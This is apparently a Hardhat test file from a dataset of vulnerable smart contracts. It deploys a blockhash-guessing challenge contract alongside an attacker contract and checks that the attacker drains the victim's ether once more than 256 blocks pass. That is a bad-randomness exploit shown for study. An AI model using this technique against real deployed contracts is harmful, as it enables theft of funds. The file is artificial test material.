const {
  loadFixture,
  mine,
} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack bad_randomness/old_blockhash.sol", function () {
  let amount;
  async function deployContracts() {
    const [v, a] = await ethers.getSigners();
    amount = ethers.parseEther("1");

    const options = {
      from: v,
      value: amount,
    };
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/bad_randomness/old_blockhash.sol/PredictTheBlockHashChallenge.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const PredictTheBlockHashChallenge = await ethers.getContractFactory(
      json.abi,
      json.bytecode,
    );
    const victim = await PredictTheBlockHashChallenge.deploy(options);
    await victim.waitForDeployment();

    const PredictTheBlockHashChallengeAttacker =
      await ethers.getContractFactory(
        "contracts/bad_randomness/old_blockhash_attack.sol:PredictTheBlockHashChallengeAttacker",
      );
    const attacker = await PredictTheBlockHashChallengeAttacker.deploy(
      victim.target,
    );
    await attacker.waitForDeployment();

    await a.sendTransaction({
      to: attacker.target,
      value: amount,
    });

    return { victim, attacker };
  }

  it("sanity check: bad_randomness/old_blockhash.sol", async function () {
    const { victim } = await loadFixture(deployContracts);
    const [v, a] = await ethers.getSigners();
    const bytes = ethers.randomBytes(32);
    await expect(
      victim.connect(a).lockInGuess(bytes, { value: ethers.parseEther("1") }),
    ).to.not.be.reverted;
    await mine(257);
    await expect(victim.connect(a).settle()).to.not.be.reverted;
  });

  it("exploit bad randomness vulnerability", async function () {
    const { victim, attacker } = await loadFixture(deployContracts);

    const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
    expect(victimBalanceBefore).to.equal(amount);

    const attackerBalanceBefore = await ethers.provider.getBalance(
      attacker.target,
    );
    expect(attackerBalanceBefore).to.equal(amount);

    await attacker.attack();
    await mine(257);

    await attacker.retrieve();

    const victimBalanceAfter = await ethers.provider.getBalance(victim.target);
    expect(victimBalanceAfter).to.equal(0);

    const attackerBalanceAfter = await ethers.provider.getBalance(
      attacker.target,
    );
    expect(attackerBalanceAfter).to.equal(amount + amount);
  });
});
